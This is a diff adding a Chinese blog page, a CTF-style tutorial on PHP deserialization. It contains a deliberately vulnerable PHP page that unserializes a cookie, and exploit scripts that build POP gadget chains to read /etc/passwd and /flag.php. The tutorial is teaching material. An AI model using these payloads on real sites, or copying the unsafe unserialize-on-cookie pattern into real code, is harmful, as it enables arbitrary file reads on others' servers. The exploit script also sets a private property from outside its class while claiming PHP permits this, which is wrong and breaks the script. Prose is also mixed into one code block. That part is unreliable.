@@ -1,0 +1,444 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-splash="0">
+  <head>
+    <!-- meta information -->
+<meta charset="utf-8">
+<script>
+  // 这段必须在首次绘制前跑完，否则会闪白/闪一下页面
+  (function () {
+    var root = document.documentElement;
+
+    // 1) 主题：先 localStorage，再跟随系统
+    var t = null;
+    try { t = localStorage.getItem('blog-theme'); } catch (e) { }
+    if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    root.setAttribute('data-theme', t);
+
+    // 2) 有 JS 才显示开场/转场遮罩；没有 JS 时页面照常可读
+    root.classList.add('js');
+    var wantsSplash = root.getAttribute('data-splash') === '1';
+    var seen = false;
+    try { seen = sessionStorage.getItem('blog-splash') === '1'; } catch (e) { }
+    if (wantsSplash && !seen) {
+      root.classList.add('has-splash');
+    } else {
+      // 这次是「进场」，先让转场遮罩合上，再由 JS 打开
+      root.classList.add('enter-transition');
+    }
+  })();
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta name="description" content="PHP 反序列化(PHP Unserialization)1. 核心概念是什么？想象一下，你有一个复杂的 PHP 对象（比如一个包含用户姓名、年龄、权限等信息的用户对象），你想把它存到数据库或在网络间传输。直接存对象是不行的，所以你需要一种">
+<meta name="author" content="祈染安">
+<meta name="theme-color" content="#141414">
+
+<title>PHP 反序列化 &middot; 安的角落</title>
+
+<!-- icons -->
+<link rel="shortcut icon" href="/images/favicon.ico">
+
+<!-- stylesheets -->
+<link rel="stylesheet" href="/css/syntax.css">
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- feed -->
+<link rel="alternate" href="/feed.xml" type="application/rss+xml" title="安的角落">
+
+  <meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <!--
+  磁力光标：四个直角括号，靠近可吸附元素时被“吸”过去并放大；
+  吸附目标的描边图标会同时被描一遍（见 frontend.js 的 drawIcon）。
+-->
+<div class="cursor" id="cursor" aria-hidden="true">
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_label" id="cursor-label"></div>
+</div>
+
+    <!--
+  转场动画：两张“纸”从中间合上/打开，接缝处是一排声波条，
+  右下角有一枚折角，打开时会把折角展开。
+  离开页面时合上 → 新页面打开，跨页也连贯（Hexo 也是多页站点）。
+-->
+<div class="transition" id="transition" aria-hidden="true">
+  <div class="transition_half transition_half--top"></div>
+  <div class="transition_half transition_half--bottom"></div>
+
+  <div class="transition_bars">
+    
+    <div class="transition_bar" style="--d: 0.000s"></div>
+    
+    <div class="transition_bar" style="--d: 0.012s"></div>
+    
+    <div class="transition_bar" style="--d: 0.024s"></div>
+    
+    <div class="transition_bar" style="--d: 0.036s"></div>
+    
+    <div class="transition_bar" style="--d: 0.048s"></div>
+    
+    <div class="transition_bar" style="--d: 0.060s"></div>
+    
+    <div class="transition_bar" style="--d: 0.072s"></div>
+    
+    <div class="transition_bar" style="--d: 0.084s"></div>
+    
+    <div class="transition_bar" style="--d: 0.096s"></div>
+    
+    <div class="transition_bar" style="--d: 0.108s"></div>
+    
+    <div class="transition_bar" style="--d: 0.120s"></div>
+    
+    <div class="transition_bar" style="--d: 0.132s"></div>
+    
+    <div class="transition_bar" style="--d: 0.144s"></div>
+    
+    <div class="transition_bar" style="--d: 0.156s"></div>
+    
+    <div class="transition_bar" style="--d: 0.168s"></div>
+    
+    <div class="transition_bar" style="--d: 0.180s"></div>
+    
+    <div class="transition_bar" style="--d: 0.192s"></div>
+    
+    <div class="transition_bar" style="--d: 0.204s"></div>
+    
+    <div class="transition_bar" style="--d: 0.216s"></div>
+    
+    <div class="transition_bar" style="--d: 0.228s"></div>
+    
+    <div class="transition_bar" style="--d: 0.240s"></div>
+    
+    <div class="transition_bar" style="--d: 0.252s"></div>
+    
+    <div class="transition_bar" style="--d: 0.264s"></div>
+    
+    <div class="transition_bar" style="--d: 0.276s"></div>
+    
+    <div class="transition_bar" style="--d: 0.288s"></div>
+    
+    <div class="transition_bar" style="--d: 0.300s"></div>
+    
+    <div class="transition_bar" style="--d: 0.312s"></div>
+    
+    <div class="transition_bar" style="--d: 0.324s"></div>
+    
+    <div class="transition_bar" style="--d: 0.336s"></div>
+    
+    <div class="transition_bar" style="--d: 0.348s"></div>
+    
+    <div class="transition_bar" style="--d: 0.360s"></div>
+    
+    <div class="transition_bar" style="--d: 0.372s"></div>
+    
+    <div class="transition_bar" style="--d: 0.384s"></div>
+    
+    <div class="transition_bar" style="--d: 0.396s"></div>
+    
+    <div class="transition_bar" style="--d: 0.408s"></div>
+    
+    <div class="transition_bar" style="--d: 0.420s"></div>
+    
+  </div>
+
+  <div class="transition_fold"></div>
+</div>
+
+    
+
+    
+<!--
+  头像独立于 .nav 之外：.nav 用 clip-path 从左侧张开，
+  如果头像在里面会被一起裁掉，就看不到“以头像为起点”的效果了。
+-->
+<a class="nav_logo" id="nav-logo" href="/"
+   aria-label="祈染安 的主页" data-magnetic data-cursor="回到主页">
+  <img src="/images/logo.png" alt="祈染安">
+</a>
+
+<nav class="nav" id="main-navigation" aria-label="主导航">
+  <div class="nav_items">
+    
+    <a class="nav_item"
+       href="/"
+       data-magnetic data-stroke data-cursor="主页">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.2 10.7 12 3.4l8.8 7.3"/><path d="M5.7 9.9v10.3h12.6V9.9"/><path d="M9.8 20.2v-5.5h4.4v5.5"/></svg></span>
+      <span class="nav_item_label"><span>主页</span></span>
+    </a>
+    
+    <a class="nav_item"
+       href="/links/"
+       data-magnetic data-stroke data-cursor="友链">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M10.2 13.8 13.8 10.2"/><path d="M12.5 7.1 14.1 5.5a3.4 3.4 0 0 1 4.8 4.8l-1.6 1.6"/><path d="M11.5 16.9 9.9 18.5a3.4 3.4 0 0 1-4.8-4.8l1.6-1.6"/></svg></span>
+      <span class="nav_item_label"><span>友链</span></span>
+    </a>
+    
+    <a class="nav_item"
+       href="/tags/"
+       data-magnetic data-stroke data-cursor="标签">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.4 11.6V5.2a1.8 1.8 0 0 1 1.8-1.8h6.4l9 9-8.2 8.2-9-9Z"/><circle cx="8" cy="8" r="1.4"/></svg></span>
+      <span class="nav_item_label"><span>标签</span></span>
+    </a>
+    
+  </div>
+
+  <div class="nav_right">
+    <button class="nav_theme" id="theme-toggle" type="button"
+            data-magnetic data-stroke aria-label="切换深浅色" data-cursor="深浅色">
+      <span class="nav_item_icon nav_theme_icon nav_theme_icon--moon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.6 14.2A8.6 8.6 0 0 1 9.8 3.4a8.6 8.6 0 1 0 10.8 10.8Z"/></svg></span>
+      <span class="nav_item_icon nav_theme_icon nav_theme_icon--sun"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg></span>
+    </button>
+  </div>
+</nav>
+
+
+    <main class="page" id="page">
+      
+<article class="post wrap">
+  <header class="post_head">
+    <p class="post_head_date reveal"><span>2025.12.02</span></p>
+    <h1 class="post_head_title" data-split-lines>PHP 反序列化</h1>
+    
+    <p class="post_head_tag"><span class="tagpill">基础知识</span></p>
+    
+  </header>
+
+  <div class="post_body" data-reveal-body>
+    <h2 id="PHP-反序列化-PHP-Unserialization"><a href="#PHP-反序列化-PHP-Unserialization" class="headerlink" title="PHP 反序列化(PHP Unserialization)"></a>PHP 反序列化(PHP Unserialization)</h2><h4 id="1-核心概念是什么？"><a href="#1-核心概念是什么？" class="headerlink" title="1. 核心概念是什么？"></a>1. 核心概念是什么？</h4><p>想象一下，你有一个复杂的 PHP 对象（比如一个包含用户姓名、年龄、权限等信息的用户对象），你想把它存到数据库或在网络间传输。直接存对象是不行的，所以你需要一种方法把它“打包”成一个字符串。  </p>
+<p><code>serialize()</code>: PHP 的一个函数，可以将一个 PHP 对象、数组或变量“打包”（序列化）成一个可以存储或传输的字符串。  </p>
+<p><code>unserialize()</code>: 另一个函数，可以将这个字符串“解包”（反序列化），在内存中重新构造出原始的对象。</p>
+<p>漏洞的根源：这个漏洞不在 serialize() 或 unserialize() 函数本身，而在于当 unserialize() 函数处理了由攻击者精心构造的、恶意的字符串时。  </p>
+<p>当一个对象被反序列化时，PHP 会自动调用一些特殊的方法，我们称之为“魔术方法 (Magic Methods)”。如果这些魔术方法中存在可以被利用的操作（比如读写文件、执行命令），漏洞就产生了。  </p>
+<p>CTF 中最关键的魔术方法：  </p>
+<ul>
+<li><code>__construct()</code>: 创建对象时调用。  </li>
+<li><code>__destruct()</code>: 对象被销毁（通常在脚本执行结束时）前调用。这是最常见的漏洞触发点。  </li>
+<li><code>__wakeup()</code>: unserialize() 时调用。  </li>
+<li><code>__toString()</code>: 当对象被当作字符串使用时（例如 echo $obj;）调用。第二常见的触发点。  </li>
+<li><code>__get()</code>, <code>__set()</code>, <code>__call()</code>: 在访问不存在的属性或方法时调用，常作为利用链的一环。</li>
+</ul>
+<h4 id="2-在-CTF-中如何判断？"><a href="#2-在-CTF-中如何判断？" class="headerlink" title="2. 在 CTF 中如何判断？"></a>2. 在 CTF 中如何判断？</h4><p>代码审计（白盒）:  </p>
+<p>直接搜索关键字: 在源代码中全局搜索 <code>unserialize()</code>。这是最直接的信号。一旦找到，立即分析传递给它的参数是否是用户可控的（比如来自 <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>）。  </p>
+<p>寻找魔术方法: 查看项目中的各个类，看看它们有没有实现<code> __destruct</code>, <code>__wakeup</code>, <code>__toString</code> 等危险的魔术方法。  </p>
+<p>黑盒测试:  </p>
+<p>寻找特征字符串: 检查 URL 参数、POST 请求体、特别是 Cookie 的值，寻找看起来像 Base64 编码的字符串，或者直接就是 O:4:”User”:2:{s:4:”name”;s:3:”Bob”;…} 这种格式的 PHP 序列化字符串。  </p>
+<p>Fuzzing 测试: 尝试修改这些可疑的参数值。比如把序列化字符串中的某个值改掉，看看服务器是否返回 500 错误或者不同的响应。这说明服务器很可能正在尝试反序列化你的输入。  </p>
+<h4 id="3-在-CTF-中如何使用？"><a href="#3-在-CTF-中如何使用？" class="headerlink" title="3. 在 CTF 中如何使用？"></a>3. 在 CTF 中如何使用？</h4><p>利用 PHP 反序列化漏洞的核心是构造一个“POP Gadget Chain”（POP 指 Property-Oriented Programming）。你并不是注入新代码，而是利用应用程序中已经存在的类和方法，像搭积木一样把它们串联起来，最终执行危险操作。  </p>
+<p>利用流程：  </p>
+<p>寻找终点 (Sink): 在所有类的代码中，寻找一个可以直接导致漏洞利用的函数调用，比如：  </p>
+<p>文件操作: <code>file_get_contents($this-&gt;filename), unlink($this-&gt;logFile)</code>  </p>
+<p>命令执行: <code>system($this-&gt;command), exec($this-&gt;cmd)</code>  </p>
+<p>代码执行: <code>eval($this-&gt;code)</code>  </p>
+<p>寻找起点 (Source): 寻找一个会自动被调用的魔术方法，比如 <code>__destruct</code> 或 <code>__toString</code>。  </p>
+<p>构建利用链 (Gadget Chain):  </p>
+<p>如果 <code>__destruct</code> 方法直接调用了危险函数，那么恭喜你，利用非常简单。  </p>
+<p>但通常，<code>__destruct</code> 可能会调用 <code>$this-&gt;obj-&gt;someMethod()</code>。这时，你就需要去 <code>someMethod()</code> 的代码里继续寻找，看它是否又调用了其他对象的方法，一层层地往下找，直到最终能够调用到你在第一步找到的那个危险函数。  </p>
+<p>编写 EXP (Exploit):  </p>
+<p>你需要编写一个 PHP 脚本，在你的本地环境中 new 出这些在利用链中用到的类的实例。  </p>
+<p>精心设置每个对象的属性值，让它们串联起来。比如，A 对象的 obj 属性是 B 类的实例，B 对象的 cmd 属性是你想执行的命令字符串 “cat &#x2F;flag”。  </p>
+<p>最后，用 <code>serialize()</code> 函数将你构造好的最外层对象序列化成字符串，再用 <code>urlencode()</code> 或 <code>base64_encode()</code> 处理一下，作为最终的 payload 发送给目标。  </p>
+<p>简单示例：  </p>
+<p>目标代码 (Vulnerable.php):  </p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reader</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$profile</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Username: "</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">profile</span><span class="token punctuation">;</span> <span class="token comment">// 把 profile 当作字符串处理，触发 __toString</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 假设代码从 cookie 中获取数据并反序列化</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+你的利用脚本 <span class="token punctuation">(</span>poc<span class="token operator">.</span>php<span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token class-name return-type">code</span>
+<span class="token constant">PHP</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Reader</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token variable">$profile</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+
+<span class="token variable">$user_obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$reader_obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$reader_obj</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">;</span> <span class="token comment">// 设置终点 (Sink) 的参数</span>
+<span class="token variable">$user_obj</span><span class="token operator">-></span><span class="token property">profile</span> <span class="token operator">=</span> <span class="token variable">$reader_obj</span><span class="token punctuation">;</span> <span class="token comment">// 把 Reader 对象赋给 User 的 profile 属性，构建利用链</span>
+
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user_obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 生成 payload</span></code></pre>
+
+<p>你只需要把 <code>poc.php</code> 生成的字符串，放到浏览器开发者工具的 <code>Cookie (user_data)</code> 里，然后刷新页面，就能看到 <code>/etc/passwd</code> 的内容了。  </p>
+<h2 id="例题：PHP-反序列化入门题-经典题目改编"><a href="#例题：PHP-反序列化入门题-经典题目改编" class="headerlink" title="例题：PHP 反序列化入门题 (经典题目改编)"></a><strong>例题</strong>：PHP 反序列化入门题 (经典题目改编)</h2><p>这个例子综合了许多 CTF 题目中的常见模式：反序列化一个从 Cookie 读取的对象，并通过魔术方法 <code>__toString()</code> 和 <code>__destruct()</code> 串联起来，最终实现文件读取。  </p>
+<p><strong>题目描述</strong>  </p>
+<p>名称: “My Web Page”  </p>
+<p>目标: 网站上有一个功能，可以让你自定义个人页面的部分信息。你的用户名和简介被存储在 <strong>Cookie</strong> 中。请读取服务器上的 <strong>&#x2F;flag.php</strong> 文件。  </p>
+<p>源代码 (index.php):  </p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// highlight_file(__FILE__); // 假设这行被注释掉了，但我们可以推断出类似逻辑</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Profile</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$description</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$description</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">description</span> <span class="token operator">=</span> <span class="token variable">$description</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 当对象销毁时，记录日志</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logger</span><span class="token operator">-></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Profile for user '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">&#125;</span></span>' is being destroyed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$log_file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/log/app.log'</span><span class="token punctuation">;</span> <span class="token comment">// 默认日志文件</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">log</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 将日志信息追加到日志文件中</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$message</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">ReadFile</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 当对象被当作字符串处理时，读取文件内容</span>
+        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 默认逻辑：如果 cookie 中有数据，则反序列化；否则创建一个新的</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_profile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_profile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Welcome to my page!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user_profile'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 显示用户信息</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>Welcome, <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$profile</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">&#125;</span></span>&lt;/h1>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$profile</span><span class="token operator">-></span><span class="token property">description</span><span class="token punctuation">&#125;</span></span>&lt;/p>"</span><span class="token punctuation">;</span>
+
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p><strong>解析</strong>  </p>
+<p><strong>漏洞判断</strong>  </p>
+<p>入口点: 源代码明确显示 <code>unserialize(base64_decode($_COOKIE[&#39;user_profile&#39;]))</code>。这是一个典型的反序列化漏洞入口，因为 <code>$_COOKIE</code> 是用户完全可控的。  </p>
+<p>寻找 Gadget (利用链): 我们需要找到可以利用的魔术方法和危险函数。  </p>
+<p>终点 (Sink): <code>ReadFile</code> 类中的 <code>__toString()</code> 方法包含了 <code>file_get_contents($this-&gt;filename)</code>。如果我们能控制 <code>$this-&gt;filename</code> 并触发 <code>__toString()</code>，就能读取任意文件。  </p>
+<p>起点&#x2F;中继点 (Gadget): Profile 类中的 <code>__destruct()</code> 方法会在脚本结束时自动调用。它执行了 <code>$this-&gt;logger-&gt;log(...)</code>。</p>
+<p>中继点: <code>Logger</code> 类中的 <code>log()</code> 方法执行了 <code>file_put_contents($this-&gt;log_file, $message . &quot;\n&quot;, FILE_APPEND)</code>。虽然 <code>file_put_contents</code> 本身很危险（可以写 Webshell），但我们注意到 <code>$message</code> 是拼接而成的，我们很难直接控制。然而，如果 <code>$this-&gt;log_file</code> 是一个对象，并且这个对象有 <code>__toString()</code> 方法，那么在 <code>file_put_contents</code> 尝试将它作为文件名（字符串）使用时，就会触发 <code>__toString()</code>！</p>
+<p><strong>构建利用链 (POP Chain)</strong></p>
+<p>我们的目标是触发 <code>ReadFile</code> 类的 <code>__toString()</code> 方法。</p>
+<p><code>Profile::__destruct() -&gt; Logger::log() -&gt; file_put_contents() -&gt; (参数 $this-&gt;log_file 被当作字符串) -&gt; ReadFile::__toString() -&gt; file_get_contents()</code></p>
+<p>编写 Exploit 脚本 (exploit.php)</p>
+<p>我们需要在本地构造一个恶意的对象链，然后序列化它。</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// 需要定义目标代码中所有用到的类，但只需要定义其属性即可</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Profile</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$description</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// 在目标代码中 log_file 是 private, 但在反序列化时，PHP 不会检查属性可见性</span>
+    <span class="token comment">// 我们可以直接设置它。</span>
+    <span class="token keyword">private</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">ReadFile</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 1. 创建终点 Gadget 的实例</span>
+<span class="token variable">$readFile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReadFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$readFile</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag.php'</span><span class="token punctuation">;</span> <span class="token comment">// 设置要读取的文件</span>
+
+<span class="token comment">// 2. 创建中继 Gadget 的实例</span>
+<span class="token variable">$logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// 关键一步：将终点 Gadget 赋值给中继 Gadget 的属性</span>
+<span class="token comment">// 注意：即使 log_file 是 private，我们仍然可以在这里设置它</span>
+<span class="token comment">// PHP 反序列化时会强制赋值</span>
+<span class="token variable">$logger</span><span class="token operator">-></span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$readFile</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 3. 创建起点 Gadget 的实例</span>
+<span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$profile</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'attacker'</span><span class="token punctuation">;</span> <span class="token comment">// 任意值</span>
+<span class="token variable">$profile</span><span class="token operator">-></span><span class="token property">description</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hacked'</span><span class="token punctuation">;</span> <span class="token comment">// 任意值</span>
+<span class="token comment">// 关键一步：将中继 Gadget 赋值给起点 Gadget 的属性</span>
+<span class="token variable">$profile</span><span class="token operator">-></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 4. 生成 payload</span>
+<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"原始 Payload: \n"</span> <span class="token operator">.</span> <span class="token variable">$payload</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Base64 编码后的 Payload (用于 Cookie): \n"</span> <span class="token operator">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p><strong>使用</strong></p>
+<p>运行 <code>php exploit.php</code>，得到一长串 Base64 编码的字符串。</p>
+<p>打开浏览器的开发者工具 (F12)。</p>
+<p>进入“应用 (Application)” -&gt; “Cookie” 面板。</p>
+<p>找到名为 user_profile 的 Cookie，将其值替换为我们生成的 Base64 Payload。</p>
+<p>刷新页面。由于 <code>file_put_contents</code> 会把读取到的 flag 内容当作文件名而报错，flag 通常会显示在页面的错误信息或警告中。</p>
+
+  </div>
+
+  <nav class="post_nav" aria-label="文章导航">
+    
